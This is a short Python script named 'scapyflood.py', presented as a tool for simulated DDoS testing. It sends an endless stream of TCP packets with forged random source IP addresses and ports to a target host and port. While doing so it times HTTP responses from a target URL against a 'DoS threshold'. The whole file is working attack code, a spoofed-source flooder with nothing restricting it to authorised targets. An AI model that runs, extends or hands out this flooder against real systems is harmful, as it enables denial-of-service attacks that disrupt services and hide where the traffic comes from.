#!/usr/bin/env python



#scapyflood.py, a tool to do simulated ddos testing with scapy
#randomizes source port and ip address

#By @arbitrary_code

#yikes, clean this up!
from scapy.all import *

import argparse
import random
import socket
import sys
import time
import requests
import ssl
import math


#use requests response time to auto tune dos---see hss.py


def main():

	parser = argparse.ArgumentParser()

	parser.add_argument('-i', '--ipdst', nargs = 1, help='IP address to attack')
	parser.add_argument('-p', '--port', nargs = 1, help='The port to attack')
	parser.add_argument('-P', '--prot', nargs = 1, help='The protocol to use; i.e. ICMP, TCP, UDP')
	parser.add_argument('-u', '--url', nargs = 1, help = 'The URL you want to test.')
	parser.add_argument('-t', '--threshold', nargs = 1, help = 'The DoS acceptability threshold')
	parser.add_argument('-v', '--verbose', help='enable verbosity', action = 'store_true')
	args = parser.parse_args()

	print args

	if args.ipdst is None: 
		parser.print_help()
		sys.exit()



	if args.ipdst is not None:
		for a in args.ipdst:
			try:
				socket.inet_aton(a)
			except socket.error:
				print '[-] Invalid IP address entered: ' + a
				sys.exit()
		dstIp = ''.join(args.ipdst)

	dstPort = ''.join(args.port)
	dstUrl = ''.join(args.url)


	print dstPort





	while True:
		#set random source ip
		srcIp = '.'.join('%s'%random.randint(0, 255) for i in range(4))

		#set random source port
		srcPort = ''.join('%s'%random.randint(1,65535))



		#tell user what's happening
		print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)


		#attack loop

		#queue timer...is there a better way to measure latency with py requests?
		startTime=time.time()

		#uses http://docs.python-requests.org/en/master/api/

		try:
			response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
		except requests.exceptions.RequestException as e:
			print e
			sys.exit(1)
		#measure ET
		elapsedTime = str(round((time.time()-startTime)*1000.0))


		#tell the user
		print 'Target web server '+ str(dstIp)+' responded with HTTP' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'


		payload = 'foo'

		#print 'sending packet with %s %s %s %s %s'%(srcIp,dstIp,srcPort,dstPort,payload)
		#TCP packet scapy send
		send(IP(src=srcIp, dst=dstIp) / TCP(sport=int(srcPort), dport=int(dstPort)) / payload )


		if float(elapsedTime) <= float(''.join(args.threshold)):
			print 'under DoS threshold'
		else:
			float(elapsedTime) > float(''.join(args.threshold))
			print 'over DoS threshold'
			print 'elapsed time is: %s' % elapsedTime
			print ''.join(args.threshold)
			delay = abs(float(elapsedTime.split('.')[0]) - float(''.join(args.threshold)))
			print 'DoS threshold of %s met, reducing by %s' % (''.join(args.threshold), str(delay))
			time.sleep(delay/1000)





if __name__ == '__main__':
    main()


'''
scapy stuffs


	#TCP
	#send(IP(src=srcIp, dst=dstIp) / TCP(sport=srcPort, dport=dstPort) / payload )

	#ICMP
	#send(IP(src="10.0.99.100",dst="127.0.0.1")/ICMP()/"Hello World")



'''

